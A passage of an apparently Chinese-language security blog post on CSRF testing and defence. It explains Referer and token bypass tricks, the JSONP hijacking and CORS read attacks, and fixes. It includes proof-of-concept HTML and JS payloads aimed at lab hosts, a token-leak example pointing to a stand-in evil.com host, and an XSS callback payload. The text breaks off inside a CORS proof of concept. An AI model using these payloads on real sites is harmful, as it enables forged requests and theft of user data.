+&lt;p&gt;检测方法：捕获的数据包，查看在请求和响应过程中检查是否存在anti-CSRF token名 以及验证服务器是否验证anti-CSRF token的值；检测token中的可编辑字符串（可查看以及伪造）；检查referrer头是否可以伪造绕过、查看是否有二次身份认证、验证码等防御措施。&lt;/p&gt;
+&lt;h3 id=&quot;防御方式&quot;&gt;&lt;a href=&quot;#防御方式&quot; class=&quot;headerlink&quot; title=&quot;防御方式&quot;&gt;&lt;/a&gt;防御方式&lt;/h3&gt;&lt;p&gt;增加anti-CSRF token（随机token，随机性强且不易伪造，注意一点，POST请求可以隐藏在表单，如果是GET请求可以添加在cookie中）并在服务端验证&lt;/p&gt;
+&lt;p&gt;严格验证Referer，防止被绕过&lt;/p&gt;
+&lt;p&gt;关键请求使用&lt;strong&gt;验证码&lt;/strong&gt;功能（比如确认转账、确认修改密码操作等，在一些其他场景使用验证码，用户体验不是很好）&lt;/p&gt;
+&lt;p&gt;降低会话超时时间&lt;/p&gt;
+&lt;h3 id=&quot;测试工具&quot;&gt;&lt;a href=&quot;#测试工具&quot; class=&quot;headerlink&quot; title=&quot;测试工具&quot;&gt;&lt;/a&gt;测试工具&lt;/h3&gt;&lt;p&gt;burpsuit&lt;/p&gt;
+&lt;p&gt;CSRFTester（个人觉得不是很好用）&lt;/p&gt;
+&lt;h3 id=&quot;绕过referer验证&quot;&gt;&lt;a href=&quot;#绕过referer验证&quot; class=&quot;headerlink&quot; title=&quot;绕过referer验证&quot;&gt;&lt;/a&gt;绕过referer验证&lt;/h3&gt;&lt;p&gt;空Referer绕过：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;空referer头：置空&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在referer字段后添加：ftp://,http://,https://,file://,javascript:,data等协议头再发送，看是否绕过referer验证。例如https向http跳转的时候referer为空，利用https://www.eval.com/attack.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;判断referer是否存在某个关键词：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;例如dvwa中的验证server_name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;referer判断存在不存在google.com这个关键词&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;判断referer是否有某域名&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;在域名前添加&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在域名前面增加随机的a-z和0-9也可能绕过：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;添加一些特殊的符号绕过，不同的浏览器支持的符号也不一样&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://xxx.com/?https://target.org   #思路和绕过URL跳转限制类似&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#字典如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;$&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;^&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;~&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;_&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;|&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;%&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;无referer&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;与添加不同的协议跳转置空referer不同，这里是直接删除referer头，利用的时候需要在body之前POC中加入meta标签&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;POC&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;meta name=&lt;span class=&quot;string&quot;&gt;&quot;referrer&quot;&lt;/span&gt; content=&lt;span class=&quot;string&quot;&gt;&quot;never&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;meta name=&lt;span class=&quot;string&quot;&gt;&quot;referrer&quot;&lt;/span&gt; content=&lt;span class=&quot;string&quot;&gt;&quot;never&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;script&amp;gt;history.pushState(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;    &amp;lt;form action=&quot;http:/&lt;/span&gt;&lt;span class=&quot;regexp&quot;&gt;/127.0.0.1/&lt;/span&gt;test.php&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;      &amp;lt;input type=&quot;&lt;/span&gt;submit&lt;span class=&quot;string&quot;&gt;&quot; value=&quot;&lt;/span&gt;Submit request&lt;span class=&quot;string&quot;&gt;&quot; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    &amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;      document.forms[0].submit();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;思路：&lt;a href=&quot;https://gh0st.cn/archives/2018-08-01/1&quot;&gt;组合拳绕过referer限制&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;反射型XSS时受到了referer限制，通过URL重定向漏洞绕过referer限制触发XSS，xss处存在jsonp劫持漏洞，如果直接触发jsonp也受到referer限制，所以通过反射性xss加载jsonp的POC再配合URL跳转漏洞触发。总体上就是URL重定向绕过了xss的referer限制，xss又绕过了jsonp的referer限制。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;以上时key师傅的思路，由于文章中的任意URL跳转也是再子域，时referer允许的，个人认为可以直接加载jsonp的POC连接绕过。&lt;/p&gt;
+&lt;h3 id=&quot;绕过token&quot;&gt;&lt;a href=&quot;#绕过token&quot; class=&quot;headerlink&quot; title=&quot;绕过token&quot;&gt;&lt;/a&gt;绕过token&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;GET型token泄露：例如页面包含&lt;code&gt;&amp;lt;img src=&amp;quot;http://www.evil.com/&amp;quot;/&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;POST型token泄露:利用XSS漏洞获取其Cookie，查看存储在其中的Token(组合漏洞)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;总结bypass方法&quot;&gt;&lt;a href=&quot;#总结bypass方法&quot; class=&quot;headerlink&quot; title=&quot;总结bypass方法&quot;&gt;&lt;/a&gt;总结bypass方法&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;删： CSRF token 、referer、 XRSF Header&lt;/li&gt;
+&lt;li&gt;置空： CSRF token 、referer&lt;/li&gt;
+&lt;li&gt;修改请求方法：POST改为GET&lt;/li&gt;
+&lt;li&gt;修改 与token相同长度的任意字符串替换token&lt;/li&gt;
+&lt;li&gt;固定token&lt;/li&gt;
+&lt;li&gt;组合漏洞：XSS+CSRF(xss打token,cookie或者利用子域的xss漏洞和csrf组合绕过验证)&lt;/li&gt;
+&lt;li&gt;token泄露（&lt;a href=&quot;http://www.anquan.us/static/bugs/wooyun-2015-090935.html&quot;&gt;referer泄露toekn&lt;/a&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;读取型CSRF&quot;&gt;&lt;a href=&quot;#读取型CSRF&quot; class=&quot;headerlink&quot; title=&quot;读取型CSRF&quot;&gt;&lt;/a&gt;读取型CSRF&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;前面总结的CSRF是按提交方式分的，且场景是在增删改的情况下触发的，还有一种是读类型的CSRF，由jsonp劫持和CORS跨域资源共享，Flash跨域劫持等，通过这几种方式可以读一些敏感信息出来。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;jsonp劫持&quot;&gt;&lt;a href=&quot;#jsonp劫持&quot; class=&quot;headerlink&quot; title=&quot;jsonp劫持&quot;&gt;&lt;/a&gt;jsonp劫持&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &amp;lt;script&amp;gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JSONP包含两部分：回调函数和数据。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;回调函数是当响应到来时要放在当前页面被调用的函数。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;数据就是传入回调函数中的json数据，也就是回调函数的参数了。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;jsonp劫持只需要有这个参数，再去读取这个参数就可以进行jsonp劫持了&lt;/p&gt;
+&lt;p&gt;jsonp劫持测试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403076.19.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;jsonp劫持在实际中也像上图这样调用返回一些信息，挖掘的时候利用如&lt;script&gt;标签跨域加载恶意的构造的语句即可劫持获取相应的信息&lt;/p&gt;
+&lt;p&gt;Poc如下所示:测试时只需要修改函数名test，以及劫持的地址即可，可以使用key写的pocbox,方便快捷&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;)&lt;/span&gt;&amp;#123; alert(&lt;span class=&quot;built_in&quot;&gt;JSON&lt;/span&gt;.stringify(data)) &amp;#125;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt; &amp;lt;script src=&quot;http:/&lt;/span&gt;&lt;span class=&quot;regexp&quot;&gt;/127.0.0.1/&lt;/span&gt;DoraBox/csrf/jsonp.php?callback=test&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403500.71.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403521.67.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;组合拳：&lt;a href=&quot;https://xz.aliyun.com/t/5143&quot;&gt;JSONP绕过CSRF防护token &lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;如果可以读取页面的CSRF-token,则可以自动加入触发写类型的CSRF，同时jsonp不只可以触发csrf漏洞，由于跨域标签，还可能会触发xss漏洞&lt;code&gt;?callback=&amp;lt;script&amp;gt;alert(1111)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修复方式：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打乱响应主体内容&lt;/li&gt;
+&lt;li&gt;禁止用户自定义callback函数&lt;/li&gt;
+&lt;li&gt;Referer等进行限制&lt;/li&gt;
+&lt;li&gt;严格按照json标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;CORS跨域资源共享&quot;&gt;&lt;a href=&quot;#CORS跨域资源共享&quot; class=&quot;headerlink&quot; title=&quot;CORS跨域资源共享&quot;&gt;&lt;/a&gt;CORS跨域资源共享&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。 和jsonp的作用差不多，只不过是方式有所改变，那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有，而有时候他会通过某些参数传递 。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;CORS测试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571405767.78.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403804.38.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;如上如图，在实际的测试中，如果在返回包中出现 Access-Control-Allow-*等响应头信息则时CORS跨域设置，尝试&lt;script&gt;标签等配合XMLHttpRequest劫持获取信息。&lt;strong&gt;在测试的时候亲请求头中添加Origin: &lt;a href=&quot;http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。&quot;&gt;http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。&lt;/a&gt; &lt;code&gt;Origin&lt;/code&gt;和&lt;code&gt;Referer&lt;/code&gt;很相似，就是将当前的请求参数删除，仅剩下&lt;/strong&gt;三元组（协议 主机 端口）&lt;strong&gt;，标准的浏览器（IE浏览器除外，IE浏览器只带在协议和主机），会在每次请求中都带上&lt;code&gt;Origin&lt;/code&gt;，至少在跨域操作时肯定携带（例如ajax的操作） &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;POC如下(利用pocbox生成)&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;title&amp;gt;CORS TEST&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/title&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;&amp;lt;/&lt;/span&gt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;div id=&lt;span class=&quot;string&quot;&gt;&#39;output&#39;&lt;/span&gt;&amp;gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; 